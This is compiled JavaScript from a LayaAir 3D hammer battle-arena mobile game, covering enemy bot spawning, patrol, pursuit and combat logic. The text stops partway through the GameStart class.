var Game;
(function (Game) {
    function regUI(cls) {
        if (!cls || !cls.URL)
            return;
        fgui.UIObjectFactory.setPackageItemExtension(cls.URL, cls);
    }
    Game.regUI = regUI;
})(Game || (Game = {}));
var GameEvt;
(function (GameEvt) {
    GameEvt.NATIVEAD_REFRESH = "NATIVEAD_REFRESH";
    GameEvt.NATIVEAD_HIDE = "NATIVEAD_HIDE";
    GameEvt.LOADNATIVE_FAIL = "LOADNATIVE_FAIL";
    GameEvt.surplusRefresh = "surplusRefresh";
    GameEvt.comboRefresh = "comboRefresh";
    GameEvt.matchRefresh = "matchRefresh";
    GameEvt.closematch = "closematch";
    GameEvt.openFirst = "openFirst";
    GameEvt.killRefresh = "killRefresh";
    GameEvt.winReward = "winReward";
    GameEvt.createPoint = "createPoint";
    GameEvt.refreshPoint = "refreshPoint";
    GameEvt.pointClear = "pointClear";
    GameEvt.HomeHummerRefresh = "HomeHummerRefresh";
    GameEvt.BookCoinRefresh = "BookCoinRefresh";
    GameEvt.Skininformation = "Skininformation";
    GameEvt.bigTips = "bigTips";
    GameEvt.GAMEOVER_SHOW = 'GAMEOVER_SHOW';
    GameEvt.GAME_START = 'GAME_START';
})(GameEvt || (GameEvt = {}));
var Game;
(function (Game) {
    class EnemyManager extends Laya.Script {
        constructor() {
            super();
            this.enemyPos = [];
            this.enemys = [];
            this.trees = [];
            this.boms = [];
            this.centerPos = new Laya.Vector3(0, 0, 0);
            this.nowMatch = 0;
            Game.GameManager.instance.EnemyManager = this;
        }
        onAwake() {
            this.persons = this.owner;
            this.player = this.persons.getChildAt(0);
        }
        RandomEnemy() {
            let mapRndom = this.getMapIndex(ConfigMgr.Map_Name);
            let mapPeoples = this.getMapPeople(Arena[mapRndom].map);
            let peopleNums = Arena[mapRndom].playerNum - 1;
            ConfigMgr.Match_Num = peopleNums;
            ConfigMgr.allpeoples = peopleNums;
            ConfigMgr.Map_Name = Arena[mapRndom].id;
            this.nowMatch = 0;
            ConfigMgr.AI_Information = [];
            for (let i = 0; i < ConfigMgr.Match_Num; i++) {
                ConfigMgr.AI_Information.push({ headUrl: "", name: "" });
            }
            Game.GameManager.instance.SceneManager.mapName = Arena[mapRndom].id;
            for (let i = 0; i < 6; i++) {
                this.randomPos([-5, 5], [-5, 5], 5, 0, []);
            }
            let otherNum = peopleNums - this.enemyPos.length;
            for (let m = 0; m < otherNum; m++) {
                this.randomPos([-20, 20], [-20, 20], 5, 0, []);
            }
            for (let j = 0; j < this.enemyPos.length; j++) {
                let enemy = Game.Pool.instance.creatPoolObj("enemy", this.persons, this.enemyPos[j], Laya.MeshSprite3D);
                let enemyScript = enemy.getComponent(Game.EnemyMove);
                let AI_index = 0;
                for (let index = 0; index < mapPeoples.length; index++) {
                    if (mapPeoples[index].num != 0) {
                        mapPeoples[index].num -= 1;
                        AI_index = this.getAIIndex(mapPeoples[index].name);
                        break;
                    }
                }
                ConfigMgr.AI_Information[j].name = Game.getRamdomName();
                ConfigMgr.AI_Information[j].headUrl = Game.getRamdomHeadUrl();
                enemy.active = false;
                this.randSkin(enemy);
                this.randHammer(enemy);
                enemyScript.init(AI[AI_index].patrolArea, AI[AI_index].warnArea, AI[AI_index].warnArea, AI[AI_index].warnType, AI[AI_index].playerFirst, AI[AI_index].killTime, ConfigMgr.AI_Information[j].name, ConfigMgr.AI_Information[j].headUrl);
                this.enemys.push(enemy);
            }
            let treeArrPos = [];
            for (let index = 0; index < Arena[mapRndom].treeNum; index++) {
                this.randomPos([-20, 20], [-20, 20], 5, 0, treeArrPos);
            }
            for (let a = 0; a < treeArrPos.length; a++) {
                let tree = Game.Pool.instance.creatPoolObj("tree", this.persons, treeArrPos[a], Laya.MeshSprite3D);
                tree.getComponent(Game.ObstacleCtr).isdie = false;
                this.trees.push(tree);
            }
            let bomArrPos = [];
            for (let index = 0; index < Arena[mapRndom].bomNum; index++) {
                this.randomPos([-20, 20], [-20, 20], 5, 0, bomArrPos);
            }
            for (let a = 0; a < bomArrPos.length; a++) {
                let bom = Game.Pool.instance.creatPoolObj("bomb", this.persons, bomArrPos[a], Laya.MeshSprite3D);
                bom.getComponent(Game.ObstacleCtr).isdie = false;
                this.boms.push(bom);
            }
            for (let i = 0; i < this.enemys.length; i++) {
                mvc.send(GameEvt.createPoint);
            }
            let map = Arena[mapRndom].id;
            map = map.substring(map.length - 2);
            Game.game_map = map;
            k7.xsdk.agentManager.getAnalyticsGroup().onGameStart({
                game_play_id: Game.game_map + "000",
                game_play_name: "hammer"
            });
            Game.GameManager.instance.PlayerMove.enemys = [];
            Game.GameManager.instance.PlayerMove.enemys = this.enemys;
        }
        matchDisplay(callback) {
            this.nowMatch += 1;
            let time = (Math.random() * 0.25) + 0.1;
            Laya.timer.once(time * 1000, this, () => {
                let isover = false;
                if (this.nowMatch >= 9) {
                    isover = true;
                }
                let name = "";
                let headUrl = "";
                if (this.enemys.length <= this.nowMatch) {
                    name = ConfigMgr.AI_Information[this.nowMatch - 1].name;
                    headUrl = ConfigMgr.AI_Information[this.nowMatch - 1].headUrl;
                }
                else {
                    name = Game.getRamdomName();
                    headUrl = Game.getRamdomHeadUrl();
                }
                let data = {
                    name: name,
                    head: headUrl,
                    isover: isover
                };
                if (this.enemys.length >= this.nowMatch) {
                    let enemy = this.enemys[this.nowMatch - 1];
                    enemy.active = true;
                    enemy.transform.localScale = new Laya.Vector3(0.1, 0.1, 0.1);
                    Laya.Tween.to(enemy.transform, { localScaleX: Grow[0].scaling, localScaleY: Grow[0].scaling, localScaleZ: Grow[0].scaling }, 500, Laya.Ease.circIn, Laya.Handler.create(this, () => {
                        let enemyScr = enemy.getComponent(Game.EnemyMove);
                        enemyScr.enemyAni.attack(null, null);
                    }));
                }
                mvc.send(GameEvt.matchRefresh, data);
                if (!isover) {
                    this.matchDisplay(callback);
                }
                else {
                    mvc.send(GameEvt.surplusRefresh, this.enemys.length);
                    if (this.enemys.length > this.nowMatch) {
                        for (let i = this.nowMatch; i < this.enemys.length; i++) {
                            this.enemys[i].active = true;
                        }
                    }
                    if (callback) {
                        callback();
                    }
                }
            });
        }
        getMapPeople(mapStr = "map_1") {
            let arr = [];
            let map_index = 0;
            for (let i = 0; i < Arena.length; i++) {
                if (Arena[i].map == mapStr) {
                    map_index = i;
                    break;
                }
            }
            let obj1 = {
                num: 0,
                name: ""
            };
            if (Arena[map_index].ai1 != null) {
                obj1.num = Number(Arena[map_index].ai1.substr(Arena[map_index].ai1.length - 1, 1));
                obj1.name = Arena[map_index].ai1.substring(0, 4);
                arr.push(obj1);
            }
            else {
                arr.push(obj1);
            }
            let obj2 = {
                num: 0,
                name: ""
            };
            if (Arena[map_index].ai2 != null) {
                obj2.num = Number(Arena[map_index].ai2.substr(Arena[map_index].ai2.length - 1, 1));
                obj2.name = Arena[map_index].ai2.substring(0, 4);
                arr.push(obj2);
            }
            else {
                arr.push(obj2);
            }
            let obj3 = {
                num: 0,
                name: ""
            };
            if (Arena[map_index].ai3 != null) {
                obj3.num = Number(Arena[map_index].ai3.substr(Arena[map_index].ai3.length - 1, 1));
                obj3.name = Arena[map_index].ai3.substring(0, 4);
                arr.push(obj3);
            }
            else {
                arr.push(obj3);
            }
            let obj4 = {
                num: 0,
                name: ""
            };
            if (Arena[map_index].ai4 != null) {
                obj4.num = Number(Arena[map_index].ai4.substr(Arena[map_index].ai4.length - 1, 1));
                obj4.name = Arena[map_index].ai4.substring(0, 4);
                arr.push(obj4);
            }
            else {
                arr.push(obj4);
            }
            let obj5 = {
                num: 0,
                name: ""
            };
            if (Arena[map_index].ai5 != null) {
                obj5.num = Number(Arena[map_index].ai5.substr(Arena[map_index].ai5.length - 1, 1));
                obj5.name = Arena[map_index].ai5.substring(0, 4);
                arr.push(obj5);
            }
            else {
                arr.push(obj5);
            }
            return arr;
        }
        getMapIndex(mapName) {
            let map_index = 0;
            for (let i = 0; i < Arena.length; i++) {
                if (Arena[i].id == mapName) {
                    map_index = i;
                    break;
                }
            }
            return map_index;
        }
        getAIIndex(AIName) {
            let AiIndex = 0;
            for (let index = 0; index < AI.length; index++) {
                if (AI[index].id == AIName) {
                    AiIndex = index;
                    break;
                }
            }
            return AiIndex;
        }
        initEnemy() {
            for (let i = 0; i < this.enemys.length; i++) {
                this.enemys[i].getComponent(Game.EnemyMove).enemyStart();
            }
        }
        randomPos(RangeX = [], RangeY = [], dis, randNum = 0, arr) {
            randNum += 1;
            let maxX = RangeX[1] - RangeY[0];
            let minX = RangeX[0];
            let randX = Math.random() * maxX + minX;
            let maxY = RangeY[1] - RangeY[0];
            let minY = RangeY[0];
            let randY = Math.random() * maxY + minY;
            let randPos = new Laya.Vector3(randX, 0, randY);
            if (this.enemyPos.length == 0) {
                if (Laya.Vector3.distance(this.player.transform.localPosition, randPos) >= dis) {
                    this.enemyPos.push(randPos);
                    arr.push(randPos);
                }
                else {
                    if (randNum >= 100) {
                        return;
                    }
                    this.randomPos(RangeX, RangeY, dis, randNum, arr);
                }
            }
            else {
                let randAgain = false;
                for (let i = 0; i < this.enemyPos.length; i++) {
                    if (Laya.Vector3.distance(this.enemyPos[i], randPos) < dis || Laya.Vector3.distance(this.player.transform.localPosition, randPos) < dis || Laya.Vector3.distance(this.centerPos, randPos) > 20) {
                        randAgain = true;
                        break;
                    }
                }
                if (randAgain) {
                    if (randNum >= 100) {
                        return;
                    }
                    this.randomPos(RangeX, RangeY, dis, randNum, arr);
                }
                else {
                    this.enemyPos.push(randPos);
                    arr.push(randPos);
                }
            }
        }
        randSkin(target) {
            let randNum = Math.floor(Math.random() * Skin.length);
            let modleName = Skin[randNum].model;
            let AIUse = Skin[randNum].AIUse;
            if (AIUse != 0) {
                let modle = Game.GameManager.instance.SceneManager.setPlayerSkin(modleName, target);
                if (modle) {
                    modle.active = true;
                }
                else {
                    return this.randSkin(target);
                }
            }
            else {
                return this.randSkin(target);
            }
        }
        randHammer(target) {
            let randNum = Math.floor(Math.random() * Hammer.length);
            let modleName = Hammer[randNum].model;
            let modle = Game.GameManager.instance.SceneManager.setHammerSkin(modleName, target);
            if (modle) {
                modle.active = true;
            }
            else {
                return this.randHammer(target);
            }
        }
        clearEnemy() {
            this.enemys.forEach(element => {
                if (element.parent) {
                    element.getComponent(Game.EnemyMove).isdie = true;
                    element.getComponent(Game.EnemyMove).isstart = false;
                    Game.Pool.instance.recoveryObj("enemy", element);
                }
            });
            this.trees.forEach(element => {
                if (element.parent) {
                    Game.Pool.instance.recoveryObj("tree", element);
                }
            });
            this.boms.forEach(element => {
                if (element.parent) {
                    Game.Pool.instance.recoveryObj("bomb", element);
                }
            });
            mvc.send(GameEvt.pointClear);
            this.enemys = [];
            this.enemyPos = [];
            this.trees = [];
            this.boms = [];
        }
        randChangeScale() {
            let playerLv = Game.GameManager.instance.PlayerMove.playerLv;
            let arr = [];
            for (let i = 0; i < this.enemys.length; i++) {
                if (this.enemys[i].parent) {
                    let dis = Laya.Vector3.distance(this.player.transform.localPosition.clone(), this.enemys[i].transform.localPosition.clone());
                    if (dis > Game.changeDis) {
                        arr.push(this.enemys[i]);
                    }
                }
            }
            if (arr.length == 0)
                return;
            let changeArr = this.bubbleSort(arr);
            let enemyScript = changeArr[0].getComponent(Game.EnemyMove);
            if (enemyScript.enemyLv < (playerLv - 2) && enemyScript.enemyLv < 8) {
                let change = enemyScript.enemyLv;
                enemyScript.enemyLv = (playerLv - 2);
                if (enemyScript.enemyLv > 8) {
                    enemyScript.enemyLv = 8;
                }
                change = Math.floor(Math.random() * 3) + 4;
                let scaleNum = Grow[enemyScript.enemyLv - 1].scaling;
                Laya.Tween.to(changeArr[0].transform, { localScaleX: (scaleNum + 0.1), localScaleY: (scaleNum + 0.1), localScaleZ: (scaleNum + 0.1) }, 100, null, Laya.Handler.create(this, () => {
                    Laya.Tween.to(changeArr[0].transform, { localScaleX: scaleNum, localScaleY: scaleNum, localScaleZ: scaleNum }, 150, null);
                }));
                let datas = {
                    tip: "Get Bigger x" + change + "",
                    head: enemyScript.selfHead
                };
                //mvc.send(GameEvt.bigTips, datas);
            }
        }
        bubbleSort(arr) {
            let len = arr.length;
            for (let i = 0; i < len - 1; i++) {
                for (let j = 0; j < len - 1 - i; j++) {
                    if (arr[j].getComponent(Game.EnemyMove).enemyLv > arr[j + 1].getComponent(Game.EnemyMove).enemyLv) {
                        let temp = arr[j + 1];
                        arr[j + 1] = arr[j];
                        arr[j] = temp;
                    }
                }
            }
            return arr;
        }
    }
    Game.EnemyManager = EnemyManager;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class EnemyMove extends Laya.Script {
        constructor() {
            super();
            this.enemyLv = 1;
            this.isdie = false;
            this.otherPersons = [];
            this.isstart = false;
            this.centerPos = new Laya.Vector3(0, 0, 0);
            this.landCenter = new Laya.Vector3(0, 0, 0);
            this.movePos = new Laya.Vector3(0, 0, 0);
            this.isrot = false;
            this.patrolArea = 0;
            this.warnArea = 0;
            this.pursueArea = 0;
            this.warnType = 1;
            this.playerFirst = 0;
            this.killTime = 1000;
            this.isKillTimer = false;
            this.isattack = false;
            this.pursueCenter = new Laya.Vector3(0, 0, 0);
            this.isgoIn = false;
            this.selfHead = "";
            this.selfName = "";
            this.ispursueArea = false;
            this.isescape = false;
        }
        onAwake() {
            this.enemy = this.owner;
            this.persons = this.enemy.parent;
            this.enemyAni = this.enemy.addComponent(Game.PlayerAni);
            this.chuizi = Game.GameManager.instance.SceneManager.findChild("Bip001/Bip001 Pelvis/Bip001 Spine/Bip001 Neck/Bip001 R Clavicle/Bip001 R UpperArm/Bip001 R Forearm/Bip001 R Hand/wuqi", this.enemy);
        }
        onLateUpdate() {
            if (!this.isstart)
                return;
            if (this.isdie) {
                this.enemy.transform.translate(this.movePos, false);
                return;
            }
            ;
            if (this.isrot)
                return;
            let landDis = Laya.Vector3.distance(this.enemy.transform.localPosition.clone(), this.landCenter);
            if (landDis >= 26) {
                let newPos = new Laya.Vector3(this.enemy.transform.localPositionX + this.movePos.x * 10, 0, this.enemy.transform.localPositionZ + this.movePos.z * 10);
                let dis3 = Laya.Vector3.distance(newPos, this.landCenter);
                if (dis3 >= 25) {
                    if (!this.isgoIn) {
                        this.isgoIn = true;
                        this.goInFun();
                    }
                }
            }
            if (this.isgoIn) {
                if (landDis < (25 - this.patrolArea)) {
                    this.isgoIn = false;
                    this.isattack = false;
                    this.isKillTimer = false;
                    this.centerPos = this.enemy.transform.localPosition.clone();
                    this.circlePatrol();
                }
            }
            else {
                if (!this.isattack) {
                    if (this.isescape) {
                        if (this.target) {
                            let escapeDis = Laya.Vector3.distance(this.target.transform.localPosition.clone(), this.enemy.transform.localPosition.clone());
                            if (escapeDis >= this.warnArea) {
                                this.isescape = false;
                                this.isKillTimer = false;
                                this.centerPos = this.enemy.transform.localPosition.clone();
                                this.circlePatrol();
                            }
                        }
                        else {
                            this.isescape = false;
                            this.isKillTimer = false;
                            this.centerPos = this.enemy.transform.localPosition.clone();
                            this.circlePatrol();
                        }
                    }
                    else {
                        let dis = Laya.Vector3.distance(this.enemy.transform.localPosition.clone(), this.centerPos);
                        if (dis >= 5) {
                            let newPos = new Laya.Vector3(this.enemy.transform.localPositionX + this.movePos.x * 10, 0, this.enemy.transform.localPositionZ + this.movePos.z * 10);
                            let dis2 = Laya.Vector3.distance(newPos, this.centerPos);
                            if (dis2 >= 5) {
                                this.circlePatrol();
                            }
                        }
                    }
                }
                else {
                    this.pursueAreaFun(this.target);
                }
            }
            if (landDis >= 35 && this.isdie == false) {
                this.enemyDie();
            }
            this.enemy.transform.translate(this.movePos, false);
            this.hasPerson();
        }
        init(patrolArea, warnArea, pursueArea, warnType, playerFirst, killTime, name, head) {
            this.patrolArea = patrolArea;
            this.warnArea = warnArea;
            this.pursueArea = pursueArea;
            this.warnType = warnType;
            this.playerFirst = playerFirst;
            this.killTime = killTime;
            this.selfHead = head;
            this.selfName = name;
            this.isdie = false;
            this.isstart = false;
            this.enemyAni.stand();
            this.otherPersons = [];
            this.enemy.transform.localScale = new Laya.Vector3(Grow[0].scaling, Grow[0].scaling, Grow[0].scaling);
            this.enemy.transform.localRotationEuler = new Laya.Vector3(0, 0, 0);
            this.enemyLv = 1;
        }
        changeMove() {
            if (this.isdie)
                return;
            let rotation = this.enemy.transform.localRotationEulerY - 90 + 180;
            let rot = rotation * Math.PI / 180;
            let x = Math.cos(rot) / 20;
            let z = Math.sin(rot) / 20;
            let addX = -x * (Game.robotSpd / 100);
            let addZ = z * (Game.robotSpd / 100);
            this.movePos.x = addX;
            this.movePos.z = addZ;
            this.isrot = false;
        }
        enemyStart() {
            for (let i = 0; i < this.persons.numChildren; i++) {
                let other = this.persons.getChildAt(i);
                if (other != this.enemy) {
                    this.otherPersons.push(other);
                }
            }
            this.centerPos = this.enemy.transform.localPosition.clone();
            this.circlePatrol();
            this.enemyAni.run();
            this.isstart = true;
            this.enemy.active = true;
            this.enemy.transform.localScale = new Laya.Vector3(Grow[0].scaling, Grow[0].scaling, Grow[0].scaling);
        }
        enemyDie() {
            this.chuizi.active = false;
            Laya.Tween.clearTween(this.enemy);
            Game.GameManager.instance.SceneManager.enemyboomPlay(new Laya.Vector3(this.enemy.transform.localPositionX, 0.5, this.enemy.transform.localPositionZ));
            this.movePos.x = 0;
            this.movePos.z = 0;
            this.isstart = false;
            Laya.Tween.clearTween(this.enemy);
            this.isdie = true;
            this.enemyAni.stand();
            this.enemy.transform.localRotationEulerX = -90;
            this.enemy.transform.localScaleZ = 0.01;
            this.enemyAni.die();
            Laya.timer.once(1000, this, () => {
                this.enemy.transform.localScale = new Laya.Vector3(Grow[0].scaling, Grow[0].scaling, Grow[0].scaling);
                this.enemy.transform.localRotationEuler = new Laya.Vector3(0, 0, 0);
                this.chuizi.active = true;
                Game.Pool.instance.recoveryObj("enemy", this.enemy);
                mvc.send(GameEvt.surplusRefresh, ConfigMgr.Match_Num + 1);
            });
        }
        circlePatrol() {
            this.isrot = true;
            this.movePos.x = 0;
            this.movePos.z = 0;
            let randAngle = this.GetAngle();
            Laya.Tween.to(this.enemy.transform, { localRotationEulerY: randAngle }, 200, null, Laya.Handler.create(this, () => {
                this.changeMove();
            }));
        }
        goInFun() {
            let rot = Game.GameManager.instance.SceneManager.getAngle(this.enemy, this.persons);
            this.enemy.transform.localRotationEulerY = rot;
            this.changeMove();
        }
        GetAngle(Num = 0) {
            if (this.isdie)
                return;
            Num += 1;
            let randAngle = Math.floor(Math.random() * 360);
            let rotation = randAngle - 90 + 180;
            let rot = rotation * Math.PI / 180;
            let x = Math.cos(rot) / 20;
            let z = Math.sin(rot) / 20;
            let addX = -x * (Game.robotSpd / 100);
            let addZ = z * (Game.robotSpd / 100);
            let newPos = new Laya.Vector3(this.enemy.transform.localPositionX + addX * 10, 0, this.enemy.transform.localPositionZ + addZ * 10);
            let dis2 = Laya.Vector3.distance(newPos, this.centerPos);
            if (dis2 >= 5) {
                if (Num >= 100) {
                    randAngle = 0;
                    return randAngle;
                }
                return this.GetAngle(Num);
            }
            else {
                return randAngle;
            }
        }
        hasPerson() {
            let arr = [];
            for (let i = 0; i < this.otherPersons.length; i++) {
                if (this.otherPersons[i].parent) {
                    let distance = Laya.Vector3.distance(this.otherPersons[i].transform.localPosition, this.enemy.transform.localPosition);
                    if (distance <= this.warnArea) {
                        if (this.otherPersons[i].name == "player") {
                            if (this.otherPersons[i].getComponent(Game.PlayerMove).isdie == true)
                                continue;
                        }
                        else if (this.otherPersons[i].name == "bomb")
                            continue;
                        arr.push(this.otherPersons[i]);
                    }
                }
            }
            this.screenTarget(arr);
        }
        screenTarget(arr) {
            if (arr.length == 0)
                return;
            if (arr.length == 1) {
                this.warnAreaFun(arr[0]);
            }
            else {
                if (this.playerFirst == 2) {
                    this.warnAreaFun(this.getNear(arr, true));
                }
                else {
                    this.warnAreaFun(this.getNear(arr, false));
                }
            }
        }
        getNear(arr, isplayer = false) {
            let disDance = 0;
            let target;
            for (let i = 0; i < arr.length; i++) {
                if (isplayer) {
                    if (arr[i].name == "player")
                        return arr[i];
                }
                let dis = Laya.Vector3.distance(this.enemy.transform.localPosition.clone(), arr[i].transform.localPosition.clone());
                if (disDance == 0 || disDance > dis) {
                    disDance = dis;
                    target = arr[i];
                }
            }
            return target;
        }
        warnAreaFun(target) {
            if (this.warnType == 1) {
                if (this.isKillTimer)
                    return;
                this.isKillTimer = true;
                Laya.timer.once(this.killTime, this, () => {
                    let dis = Laya.Vector3.distance(this.enemy.transform.localPosition.clone(), target.transform.localPosition.clone());
                    if (dis <= this.warnArea) {
                        Game.GameManager.instance.SceneManager.sectorCollision(this.enemy.transform.localScaleX * 3, 40, target, this.enemy, () => {
                            this.isattack = true;
                            this.target = target;
                            this.pursueCenter = this.enemy.transform.localPosition.clone();
                        }, () => {
                            this.isKillTimer = false;
                        });
                    }
                    else {
                        this.isKillTimer = false;
                    }
                });
            }
            else if (this.warnType == 2) {
                if (this.isKillTimer)
                    return;
                this.isKillTimer = true;
                Laya.timer.once(this.killTime, this, () => {
                    let dis = Laya.Vector3.distance(this.enemy.transform.localPosition.clone(), target.transform.localPosition.clone());
                    if (dis <= this.warnArea) {
                        Game.GameManager.instance.SceneManager.sectorCollision(this.enemy.transform.localScaleX * 3, 40, target, this.enemy, () => {
                            this.isattack = true;
                            this.target = target;
                            this.pursueCenter = this.enemy.transform.localPosition.clone();
                        }, () => {
                            let lv = 0;
                            if (target.name == "player") {
                                lv = target.getComponent(Game.PlayerMove).playerLv;
                            }
                            else if (target.name == "enemy") {
                                lv = target.getComponent(EnemyMove).enemyLv;
                            }
                            if (lv <= this.enemyLv) {
                                this.isattack = true;
                                this.target = target;
                                this.pursueCenter = this.enemy.transform.localPosition.clone();
                            }
                            else {
                                this.isKillTimer = false;
                            }
                        });
                    }
                    else {
                        this.isKillTimer = false;
                    }
                });
            }
            else if (this.warnType == 3) {
                if (this.isKillTimer)
                    return;
                this.isKillTimer = true;
                Laya.timer.once(this.killTime, this, () => {
                    let dis = Laya.Vector3.distance(this.enemy.transform.localPosition.clone(), target.transform.localPosition.clone());
                    if (dis <= this.warnArea) {
                        Game.GameManager.instance.SceneManager.sectorCollision(this.enemy.transform.localScaleX * 3, 40, target, this.enemy, () => {
                            this.isattack = true;
                            this.target = target;
                            this.pursueCenter = this.enemy.transform.localPosition.clone();
                        }, () => {
                            let lv = 0;
                            if (target.name == "player") {
                                lv = target.getComponent(Game.PlayerMove).playerLv;
                            }
                            else if (target.name == "enemy") {
                                lv = target.getComponent(EnemyMove).enemyLv;
                            }
                            if (lv <= (this.enemyLv + 2)) {
                                this.isattack = true;
                                this.target = target;
                                this.pursueCenter = this.enemy.transform.localPosition.clone();
                            }
                            else {
                                this.isKillTimer = false;
                            }
                        });
                    }
                    else {
                        this.isKillTimer = false;
                    }
                });
            }
            else if (this.warnType == 4) {
                if (this.isKillTimer)
                    return;
                this.isKillTimer = true;
                Laya.timer.once(this.killTime, this, () => {
                    let dis = Laya.Vector3.distance(this.enemy.transform.localPosition.clone(), target.transform.localPosition.clone());
                    if (dis <= this.warnArea) {
                        this.isattack = true;
                        this.target = target;
                        this.pursueCenter = this.enemy.transform.localPosition.clone();
                    }
                    else {
                        this.isKillTimer = false;
                    }
                });
            }
        }
        pursueAreaFun(target) {
            if (this.ispursueArea)
                return;
            if (!target.parent) {
                this.isattack = false;
                this.isKillTimer = false;
                this.centerPos = this.enemy.transform.localPosition.clone();
                this.circlePatrol();
                return;
            }
            let rot = Game.GameManager.instance.SceneManager.getAngle(this.enemy, target);
            this.enemy.transform.localRotationEulerY = rot;
            this.changeMove();
            let dis = Laya.Vector3.distance(this.enemy.transform.localPosition, target.transform.localPosition);
            let dis2 = Laya.Vector3.distance(this.enemy.transform.localPosition, this.pursueCenter);
            if (dis2 >= this.pursueArea) {
                this.isattack = false;
                this.isKillTimer = false;
                this.centerPos = this.enemy.transform.localPosition.clone();
                this.circlePatrol();
                return;
            }
            if (dis <= this.enemy.transform.localScaleX) {
                this.ispursueArea = true;
                this.movePos.x = 0;
                this.movePos.z = 0;
                let rot = Game.GameManager.instance.SceneManager.getAngle(this.enemy, target);
                Laya.Tween.to(this.enemy.transform, { localRotationEulerY: rot }, 100, null);
                this.enemyAni.attack(() => {
                    if (this.enemy.parent && !this.isdie) {
                        this.enemyAni.run();
                        this.isattack = false;
                        this.ispursueArea = false;
                        this.isKillTimer = false;
                        this.centerPos = this.enemy.transform.localPosition.clone();
                        this.circlePatrol();
                    }
                }, null);
                Laya.timer.once(300, this, () => {
                    let arr = [];
                    for (let i = 0; i < this.otherPersons.length; i++) {
                        if (this.otherPersons[i].parent) {
                            if (this.otherPersons[i].name == "player") {
                                if (this.otherPersons[i].getComponent(Game.PlayerMove).isdie)
                                    continue;
                            }
                            else if (this.otherPersons[i].name == "enemy") {
                                if (this.otherPersons[i].getComponent(EnemyMove).isdie)
                                    continue;
                            }
                            Game.GameManager.instance.SceneManager.sectorCollision(this.enemy.transform.localScaleX * 3, 40, this.otherPersons[i], this.enemy, () => {
                                arr.push(this.otherPersons[i]);
                            });
                        }
                    }
                    this.judgeAttack(arr);
                });
            }
        }
        judgeAttack(arr) {
            if (arr.length == 0)
                return;
            for (let i = 0; i < arr.length; i++) {
                let target = arr[i];
                let enemyScript;
                let playerScript;
                let obstacleCtr;
                if (this.isdie)
                    return;
                if (target.name == "player") {
                    playerScript = target.getComponent(Game.PlayerMove);
                    if (playerScript.isdie == false && playerScript.iswudi == false) {
                        playerScript.isdie = true;
                        if (this.enemyLv < Grow.length) {
                            let lv = this.enemyLv + playerScript.playerLv;
                            if (lv >= Grow.length) {
                                this.enemyLv = Grow.length;
                            }
                            else {
                                this.enemyLv += playerScript.playerLv;
                            }
                        }
                        let scaleNum = Grow[this.enemyLv - 1].scaling;
                        Laya.timer.once(100, this, () => {
                            let data = {
                                selfname: this.selfName,
                                selfhead: this.selfHead,
                                killname: playerScript.selfname,
                                killhead: playerScript.selfhead
                            };
                            mvc.send(GameEvt.killRefresh, data);
                            playerScript.playerDie();
                        });
                        Laya.timer.once(400, this, () => {
                            Laya.Tween.to(this.enemy.transform, { localScaleX: (scaleNum + 0.1), localScaleY: (scaleNum + 0.1), localScaleZ: (scaleNum + 0.1) }, 100, null, Laya.Handler.create(this, () => {
                                Laya.Tween.to(this.enemy.transform, { localScaleX: scaleNum, localScaleY: scaleNum, localScaleZ: scaleNum }, 150, null);
                            }));
                        });
                    }
                }
                else if (target.name == "enemy") {
                    enemyScript = target.getComponent(EnemyMove);
                    if (enemyScript.isdie == false) {
                        enemyScript.isdie = true;
                        ConfigMgr.Match_Num = Game.GameManager.instance.SceneManager.AINums();
                        if (this.enemyLv < Grow.length) {
                            let lv = this.enemyLv + enemyScript.enemyLv;
                            if (lv >= Grow.length) {
                                this.enemyLv = Grow.length;
                            }
                            else {
                                this.enemyLv += enemyScript.enemyLv;
                            }
                        }
                        let scaleNum = Grow[this.enemyLv - 1].scaling;
                        Laya.timer.once(100, this, () => {
                            let data = {
                                selfname: this.selfName,
                                selfhead: this.selfHead,
                                killname: enemyScript.selfName,
                                killhead: enemyScript.selfHead
                            };
                            mvc.send(GameEvt.killRefresh, data);
                            enemyScript.enemyDie();
                        });
                        Laya.timer.once(400, this, () => {
                            Laya.Tween.to(this.enemy.transform, { localScaleX: (scaleNum + 0.1), localScaleY: (scaleNum + 0.1), localScaleZ: (scaleNum + 0.1) }, 100, null, Laya.Handler.create(this, () => {
                                Laya.Tween.to(this.enemy.transform, { localScaleX: scaleNum, localScaleY: scaleNum, localScaleZ: scaleNum }, 150, null);
                            }));
                        });
                    }
                }
                else {
                    obstacleCtr = target.getComponent(Game.ObstacleCtr);
                    if (obstacleCtr.isdie == false) {
                        obstacleCtr.isdie = true;
                        if (this.enemyLv < Grow.length) {
                            let lv = this.enemyLv + obstacleCtr.enemyLv;
                            if (lv >= Grow.length) {
                                this.enemyLv = Grow.length;
                            }
                            else {
                                this.enemyLv += obstacleCtr.enemyLv;
                            }
                        }
                        let scaleNum = Grow[this.enemyLv - 1].scaling;
                        Laya.timer.once(100, this, () => {
                            obstacleCtr.enemyDie();
                        });
                        Laya.timer.once(400, this, () => {
                            Laya.Tween.to(this.enemy.transform, { localScaleX: (scaleNum + 0.1), localScaleY: (scaleNum + 0.1), localScaleZ: (scaleNum + 0.1) }, 100, null, Laya.Handler.create(this, () => {
                                Laya.Tween.to(this.enemy.transform, { localScaleX: scaleNum, localScaleY: scaleNum, localScaleZ: scaleNum }, 150, null);
                            }));
                        });
                    }
                }
            }
        }
        escapeAI(target) {
            if (this.isescape)
                return;
            if (!target.parent) {
                this.isescape = false;
                this.isKillTimer = false;
                this.centerPos = this.enemy.transform.localPosition.clone();
                this.circlePatrol();
                return;
            }
            ;
            this.isescape = true;
            this.target = target;
            this.movePos.x = 0;
            this.movePos.y = 0;
            let rot = Game.GameManager.instance.SceneManager.getAngle(this.enemy, target);
            let randRot = Math.floor(Math.random() * 150) + 30;
            rot += randRot;
            if (rot > 360) {
                rot -= 360;
            }
            Laya.Tween.to(this.enemy.transform, { localRotationEulerY: rot }, 200, null, Laya.Handler.create(this, () => {
                this.changeMove();
            }));
        }
        isInAttack(target) {
        }
    }
    Game.EnemyMove = EnemyMove;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class GameStart extends Laya.Script {
        constructor() {
            super();
            Game.GameManager.instance.GameStart = this;
        }
        game_Start() {
            k7.AppScene.show(Game.GameLoadScene);
            ConfigMgr.gameTime = new Date().getTime();
        }
        firstStart() {
            Laya.timer.once(1000, this, () => {
                Game.SoundManager.playSound(Game.SoundManager.soundName.Audio_ham_hit);
            });
            ConfigMgr.gameTime = new Date().getTime();
            console.log("loading");
            Game.GameManager.instance.SceneManager.loadFun();
        }
